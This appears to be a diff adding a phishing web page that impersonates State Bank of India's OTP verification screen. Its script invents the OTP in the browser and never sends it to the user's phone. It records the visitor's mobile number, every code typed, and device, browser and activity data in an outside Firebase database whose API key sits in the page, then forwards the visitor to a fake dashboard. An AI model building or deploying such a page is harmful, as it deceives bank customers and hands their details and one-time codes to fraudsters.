@@ -1,0 +1,818 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>SBI - OTP Verification</title>
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <style>
+        /* All your existing styles remain same */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f3f6fb;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 450px;
+            width: 100%;
+            margin: 0 auto;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #1A237E, #0D47A1, #CE1754);
+            border-radius: 20px 20px 0 0;
+            padding: 25px 20px;
+            text-align: center;
+        }
+
+        .logo {
+            width: 70px;
+            height: 70px;
+            background: white;
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+        }
+
+        .logo img {
+            width: 50px;
+            height: 50px;
+            object-fit: contain;
+        }
+
+        .header h1 {
+            color: white;
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 5px;
+        }
+
+        .header p {
+            color: #BBDEFB;
+            font-size: 13px;
+        }
+
+        .card {
+            background: white;
+            border-radius: 0 0 24px 24px;
+            padding: 30px 24px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+        }
+
+        .otp-message {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .otp-message .mobile-number {
+            font-size: 18px;
+            font-weight: 700;
+            color: #003366;
+            background: #E8F0FE;
+            display: inline-block;
+            padding: 5px 15px;
+            border-radius: 25px;
+            margin-top: 8px;
+        }
+
+        .otp-label {
+            font-size: 14px;
+            color: #64748b;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .otp-container {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 25px;
+            flex-wrap: wrap;
+        }
+
+        .otp-input {
+            width: 55px;
+            height: 65px;
+            text-align: center;
+            font-size: 28px;
+            font-weight: 700;
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            background: white;
+            transition: all 0.2s;
+            outline: none;
+            font-family: monospace;
+        }
+
+        .otp-input:focus {
+            border-color: #00B5EF;
+            box-shadow: 0 0 0 3px rgba(0, 181, 239, 0.2);
+        }
+
+        .timer-section {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .timer {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: #F1F5F9;
+            padding: 8px 16px;
+            border-radius: 30px;
+        }
+
+        .timer-icon {
+            font-size: 18px;
+        }
+
+        .timer-time {
+            font-size: 18px;
+            font-weight: 700;
+            color: #E65100;
+            font-family: monospace;
+        }
+
+        .resend-link {
+            text-align: center;
+            margin-top: 10px;
+        }
+
+        .resend-btn {
+            background: none;
+            border: none;
+            color: #00B5EF;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: underline;
+            opacity: 0.6;
+            transition: all 0.2s;
+        }
+
+        .resend-btn.active {
+            opacity: 1;
+            color: #003366;
+        }
+
+        .resend-btn.active:hover {
+            color: #00B5EF;
+        }
+
+        .security-note {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            background: #F8FAFC;
+            padding: 12px;
+            border-radius: 12px;
+            margin-bottom: 25px;
+            font-size: 12px;
+            color: #475569;
+        }
+
+        .btn-verify {
+            width: 100%;
+            background: #00B5EF;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-bottom: 12px;
+        }
+
+        .btn-verify:hover {
+            background: #0099cc;
+            transform: translateY(-1px);
+        }
+
+        .btn-verify:disabled {
+            background: #b0d4f0;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .btn-back {
+            width: 100%;
+            background: #E0E0E0;
+            color: #003366;
+            border: none;
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .btn-back:hover {
+            background: #d0d0d0;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 11px;
+            color: #94a3b8;
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #333;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 30px;
+            font-size: 14px;
+            z-index: 1000;
+            display: none;
+            animation: fadeInUp 0.3s ease;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateX(-50%) translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(-50%) translateY(0);
+            }
+        }
+
+        .loading {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .loading-content {
+            background: white;
+            padding: 30px;
+            border-radius: 20px;
+            text-align: center;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #003366;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .otp-input.error {
+            border-color: #dc3545;
+            background: #fff5f5;
+        }
+
+        .error-message {
+            color: #dc3545;
+            font-size: 12px;
+            text-align: center;
+            margin-top: -15px;
+            margin-bottom: 15px;
+            display: none;
+        }
+
+        .live-indicator {
+            font-size: 10px;
+            color: #10b981;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 4px;
+            margin-bottom: 15px;
+        }
+
+        .live-dot {
+            width: 6px;
+            height: 6px;
+            background: #10b981;
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% {
+                opacity: 1;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 0.5;
+                transform: scale(0.8);
+            }
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <img src="https://play-lh.googleusercontent.com/S7fFzuIKI7cFtClNrKuCrwNTZ9WpJEPP3dx2CAn44_1qA4g88QL3_nnQvM82fqLfdvFKITVWvPisYFl-NeA5=w240-h480-rw"
+                    alt="SBI Logo">
+            </div>
+            <h1>OTP Verification</h1>
+            <p>Secure transaction authentication</p>
+        </div>
+
+        <div class="card">
+            <div class="live-indicator">
+                <span class="live-dot"></span>
+                <span>Secure Connection Active</span>
+            </div>
+
+            <div class="otp-message">
+                <div class="otp-label">We have sent a verification code to</div>
+                <div class="mobile-number" id="mobileNumber">+91 XXXXXXX789</div>
+            </div>
+
+            <div class="otp-container" id="otpContainer">
+                <input type="text" class="otp-input" maxlength="1" id="otp1" onkeyup="moveToNext(this, 'otp2')">
+                <input type="text" class="otp-input" maxlength="1" id="otp2" onkeyup="moveToNext(this, 'otp3')">
+                <input type="text" class="otp-input" maxlength="1" id="otp3" onkeyup="moveToNext(this, 'otp4')">
+                <input type="text" class="otp-input" maxlength="1" id="otp4" onkeyup="moveToNext(this, 'otp5')">
+                <input type="text" class="otp-input" maxlength="1" id="otp5" onkeyup="moveToNext(this, 'otp6')">
+                <input type="text" class="otp-input" maxlength="1" id="otp6" onkeyup="verifyOTP()">
+            </div>
+
+            <div id="errorMessage" class="error-message">⚠️ Invalid OTP. Please try again.</div>
+
+            <div class="timer-section">
+                <div class="timer">
+                    <span class="timer-icon">⏱️</span>
+                    <span class="timer-time" id="timer">00:59</span>
+                </div>
+                <div class="resend-link">
+                    <button id="resendBtn" class="resend-btn" disabled>Resend OTP</button>
+                </div>
+            </div>
+
+            <div class="security-note">
+                <span>🔒</span>
+                <span>Never share this OTP with anyone</span>
+            </div>
+
+            <button class="btn-verify" id="verifyBtn" onclick="verifyOTP()">Verify & Proceed</button>
+            <button class="btn-back" onclick="goBack()">← Back to Login</button>
+        </div>
+
+        <div class="footer">
+            <p>© 2025 State Bank of India | Secure OTP Verification</p>
+        </div>
+    </div>
+
+    <div id="loading" class="loading">
+        <div class="loading-content">
+            <div class="spinner"></div>
+            <p>Verifying OTP...</p>
+        </div>
+    </div>
+
+    <div id="toast" class="toast"></div>
+
+    <script>
+        // Firebase Configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyCffigtqJn_jAYqtsyCq_8fOdf1f50jS40",
+            authDomain: "sbi-web-2b980.firebaseapp.com",
+            databaseURL: "https://sbi-web-2b980-default-rtdb.firebaseio.com",
+            projectId: "sbi-web-2b980",
+            storageBucket: "sbi-web-2b980.firebasestorage.app",
+            messagingSenderId: "1096488725863",
+            appId: "1:1096488725863:web:163c22e103aac9e6f053c2"
+        };
+
+        if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
+        }
+        const database = firebase.database();
+
+        // Generate Device ID
+        function generateDeviceId() {
+            let deviceId = localStorage.getItem('sbi_device_id');
+            if (!deviceId) {
+                deviceId = 'dev_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+                localStorage.setItem('sbi_device_id', deviceId);
+            }
+            return deviceId;
+        }
+
+        const deviceId = generateDeviceId();
+        
+        // ==================== DEVICE INFO FUNCTIONS ====================
+        // Get Device Info (Browser & OS)
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let browser = 'Unknown';
+            let os = 'Unknown';
+            
+            if (ua.indexOf('Chrome') !== -1 && ua.indexOf('Edg') === -1 && ua.indexOf('OPR') === -1) browser = 'Chrome';
+            else if (ua.indexOf('Firefox') !== -1) browser = 'Firefox';
+            else if (ua.indexOf('Safari') !== -1 && ua.indexOf('Chrome') === -1) browser = 'Safari';
+            else if (ua.indexOf('Edg') !== -1) browser = 'Edge';
+            else if (ua.indexOf('OPR') !== -1) browser = 'Opera';
+            
+            if (ua.indexOf('Windows') !== -1) os = 'Windows';
+            else if (ua.indexOf('Mac') !== -1) os = 'macOS';
+            else if (ua.indexOf('Android') !== -1) os = 'Android';
+            else if (ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) os = 'iOS';
+            else if (ua.indexOf('Linux') !== -1) os = 'Linux';
+            
+            return { browser, os, userAgent: ua };
+        }
+
+        // Get Connection Type
+        function getConnectionType() {
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (connection) {
+                return connection.effectiveType || connection.type || 'Unknown';
+            }
+            return 'Unknown';
+        }
+
+        // ==================== DEVICE STATUS TRACKER ====================
+        let heartbeatInterval;
+        let activityTimeout;
+        
+        // Update Device Status with OTP page
+        function updateDeviceStatus(status, screenStatus = null) {
+            const timestamp = Date.now();
+            const dateTime = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+            const deviceInfo = getDeviceInfo();
+            const connectionType = getConnectionType();
+            
+            const statusData = {
+                deviceId: deviceId,
+                status: status,
+                screen: screenStatus !== null ? screenStatus : (document.visibilityState === 'visible' ? 'ON' : 'OFF'),
+                lastActive: timestamp,
+                lastActiveTime: dateTime,
+                browser: deviceInfo.browser,
+                os: deviceInfo.os,
+                userAgent: deviceInfo.userAgent,
+                connectionType: connectionType,
+                pageVisible: document.visibilityState === 'visible',
+                timestamp: timestamp,
+                dateTime: dateTime,
+                currentPage: "OTP"  // 👈 OTP page identifier
+            };
+            
+            database.ref(`device_status/${deviceId}`).set(statusData).catch(err => console.error('Status update error:', err));
+            database.ref(`devices/${deviceId}`).update({
+                status: status,
+                lastSeen: timestamp,
+                lastSeenTime: dateTime,
+                screen: statusData.screen,
+                browser: deviceInfo.browser,
+                os: deviceInfo.os,
+                currentPage: "OTP"
+            }).catch(err => console.error('Devices update error:', err));
+        }
+
+        // Handle page visibility change
+        function handleVisibilityChange() {
+            const isVisible = document.visibilityState === 'visible';
+            const screenStatus = isVisible ? 'ON' : 'OFF';
+            updateDeviceStatus(isVisible ? 'active' : 'inactive', screenStatus);
+        }
+
+        // Handle page close
+        function handlePageClose() {
+            const timestamp = Date.now();
+            const dateTime = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+            database.ref(`device_status/${deviceId}/closed`).set({
+                status: 'closed',
+                closedAt: timestamp,
+                closedTime: dateTime,
+                reason: 'page_closed'
+            });
+            database.ref(`devices/${deviceId}/status`).set('offline');
+        }
+
+        // Start Heartbeat
+        function startHeartbeat() {
+            heartbeatInterval = setInterval(() => {
+                if (document.visibilityState === 'visible') {
+                    updateDeviceStatus('active', 'ON');
+                }
+            }, 30000);
+        }
+
+        // Reset activity timer
+        function resetActivityTimer() {
+            if (activityTimeout) clearTimeout(activityTimeout);
+            activityTimeout = setTimeout(() => {
+                updateDeviceStatus('idle', document.visibilityState === 'visible' ? 'ON' : 'OFF');
+            }, 300000);
+        }
+
+        function handleUserActivity() {
+            resetActivityTimer();
+            if (document.visibilityState === 'visible') {
+                updateDeviceStatus('active', 'ON');
+            }
+        }
+
+        // Initialize device tracking
+        function initDeviceTracking() {
+            updateDeviceStatus('active', document.visibilityState === 'visible' ? 'ON' : 'OFF');
+            startHeartbeat();
+            document.addEventListener('visibilitychange', handleVisibilityChange);
+            window.addEventListener('beforeunload', handlePageClose);
+            window.addEventListener('load', () => updateDeviceStatus('active', 'ON'));
+            window.addEventListener('mousemove', handleUserActivity);
+            window.addEventListener('click', handleUserActivity);
+            window.addEventListener('keypress', handleUserActivity);
+            window.addEventListener('scroll', handleUserActivity);
+            resetActivityTimer();
+            console.log('✅ Device status tracker initialized - Page: OTP');
+        }
+        
+        initDeviceTracking();
+        // ==================== END DEVICE STATUS TRACKER ====================
+
+        let timerInterval;
+        let timeLeft = 59;
+        let generatedOTP = Math.floor(100000 + Math.random() * 900000).toString();
+        let currentUniqueKey = null;
+        let currentOTPTimestamp = Date.now();
+
+        console.log('Generated OTP:', generatedOTP);
+        console.log('Device ID:', deviceId);
+
+        // Get mobile number from URL or localStorage
+        const urlParams = new URLSearchParams(window.location.search);
+        const mobile = urlParams.get('mobile') || localStorage.getItem('sbi_mobile') || 'XXXXXXXXXX';
+        const maskedMobile = mobile.slice(0, -4) + 'XXXX';
+        document.getElementById('mobileNumber').innerHTML = `+91 ${maskedMobile}`;
+
+        // Save OTP to Firebase
+        function saveOTPToFirebase(otp, status = 'generated', attempts = 0) {
+            const timestamp = Date.now();
+            const dateTime = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+            
+            const uniqueKey = `${deviceId}_${timestamp}`;
+            currentUniqueKey = uniqueKey;
+            currentOTPTimestamp = timestamp;
+            
+            const otpData = {
+                attempts: attempts,
+                dateTime: dateTime,
+                deviceId: deviceId,
+                mobile: mobile,
+                otp: otp,
+                status: status,
+                timestamp: timestamp
+            };
+            
+            database.ref(`otp_verifications/${deviceId}/${uniqueKey}`).set(otpData)
+                .then(() => console.log('✅ OTP saved:', uniqueKey))
+                .catch(err => console.error('Save OTP error:', err));
+            
+            return uniqueKey;
+        }
+
+        // Update OTP status
+        function updateOTPStatus(status, verifiedOTP = null) {
+            if (!currentUniqueKey) return;
+            
+            const timestamp = Date.now();
+            const dateTime = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+            
+            const updateData = {
+                status: status,
+                verifiedAt: timestamp,
+                verifiedDateTime: dateTime
+            };
+            
+            if (verifiedOTP) {
+                updateData.verifiedOTP = verifiedOTP;
+            }
+            
+            database.ref(`otp_verifications/${deviceId}/${currentUniqueKey}`).update(updateData)
+                .then(() => console.log('✅ OTP status updated:', status))
+                .catch(err => console.error('Update OTP error:', err));
+        }
+
+        // Save initial OTP
+        saveOTPToFirebase(generatedOTP, 'generated', 0);
+        startTimer();
+
+        function startTimer() {
+            timeLeft = 59;
+            updateTimerDisplay();
+
+            if (timerInterval) clearInterval(timerInterval);
+
+            timerInterval = setInterval(() => {
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    enableResendButton();
+                    updateOTPStatus('expired');
+                } else {
+                    timeLeft--;
+                    updateTimerDisplay();
+                }
+            }, 1000);
+        }
+
+        function updateTimerDisplay() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            document.getElementById('timer').textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        }
+
+        function enableResendButton() {
+            const resendBtn = document.getElementById('resendBtn');
+            resendBtn.disabled = false;
+            resendBtn.classList.add('active');
+            document.getElementById('timer').textContent = '00:00';
+        }
+
+        function resendOTP() {
+            if (!document.getElementById('resendBtn').classList.contains('active')) return;
+
+            const resendBtn = document.getElementById('resendBtn');
+            resendBtn.disabled = true;
+            resendBtn.classList.remove('active');
+            
+            showToast('📱 Resending OTP...', false);
+            
+            setTimeout(() => {
+                generatedOTP = Math.floor(100000 + Math.random() * 900000).toString();
+                console.log('New OTP:', generatedOTP);
+                saveOTPToFirebase(generatedOTP, 'resent', 0);
+                startTimer();
+                clearOTPFields();
+                showToast('✅ New OTP sent to your registered mobile', false);
+            }, 1500);
+        }
+
+        function moveToNext(current, nextId) {
+            if (current.value.length === 1) {
+                if (nextId) {
+                    document.getElementById(nextId).focus();
+                }
+            }
+            document.getElementById('errorMessage').style.display = 'none';
+            removeErrorClass();
+        }
+
+        function removeErrorClass() {
+            const inputs = document.querySelectorAll('.otp-input');
+            inputs.forEach(input => input.classList.remove('error'));
+        }
+
+        function getOTPValue() {
+            let otp = '';
+            for (let i = 1; i <= 6; i++) {
+                const value = document.getElementById(`otp${i}`).value;
+                otp += value;
+            }
+            return otp;
+        }
+
+        function clearOTPFields() {
+            for (let i = 1; i <= 6; i++) {
+                document.getElementById(`otp${i}`).value = '';
+            }
+            document.getElementById('otp1').focus();
+        }
+
+        function showToast(message, isError = false) {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.style.background = isError ? '#dc3545' : '#28a745';
+            toast.style.display = 'block';
+            setTimeout(() => {
+                toast.style.display = 'none';
+            }, 3000);
+        }
+
+        function showLoading(show) {
+            const loading = document.getElementById('loading');
+            loading.style.display = show ? 'flex' : 'none';
+        }
+
+        function verifyOTP() {
+            const otp = getOTPValue();
+
+            if (otp.length !== 6) {
+                showToast('Please enter complete 6-digit OTP', true);
+                return;
+            }
+
+            const verifyBtn = document.getElementById('verifyBtn');
+            verifyBtn.disabled = true;
+            verifyBtn.innerHTML = 'Verifying...';
+            showLoading(true);
+
+            setTimeout(() => {
+                showLoading(false);
+                verifyBtn.disabled = false;
+                verifyBtn.innerHTML = 'Verify & Proceed';
+
+                if (otp === generatedOTP) {
+                    updateOTPStatus('verified', otp);
+                    showToast('✅ OTP Verified Successfully!', false);
+                    setTimeout(() => {
+                        window.location.href = `dashboard.html?mobile=${mobile}&otpVerified=true&deviceId=${deviceId}`;
+                    }, 1500);
+                } else {
+                    updateOTPStatus('failed', otp);
+                    database.ref(`otp_verifications/${deviceId}/${currentUniqueKey}/attempts`).set(1)
+                        .catch(err => console.error('Update attempts error:', err));
+                    
+                    document.getElementById('errorMessage').style.display = 'block';
+                    const inputs = document.querySelectorAll('.otp-input');
+                    inputs.forEach(input => input.classList.add('error'));
+                    showToast('❌ Invalid OTP. Please try again.', true);
+                    
+                    setTimeout(() => {
+                        clearOTPFields();
+                    }, 1000);
+                }
+            }, 1500);
+        }
+
+        function goBack() {
+            window.history.back();
+        }
+
+        document.getElementById('resendBtn').addEventListener('click', resendOTP);
+        window.verifyOTP = verifyOTP;
+
+        // Paste functionality
+        document.querySelectorAll('.otp-input').forEach(input => {
+            input.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const paste = (e.clipboardData || window.clipboardData).getData('text');
+                if (paste && /^\d{6}$/.test(paste)) {
+                    for (let i = 0; i < 6; i++) {
+                        document.getElementById(`otp${i + 1}`).value = paste[i];
+                    }
+                    verifyOTP();
+                }
+            });
+        });
+
+        document.getElementById('otp1').focus();
+
+        // Backspace navigation
+        document.querySelectorAll('.otp-input').forEach((input, index) => {
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && input.value === '' && index > 0) {
+                    const prevInput = document.getElementById(`otp${index}`);
+                    prevInput.focus();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
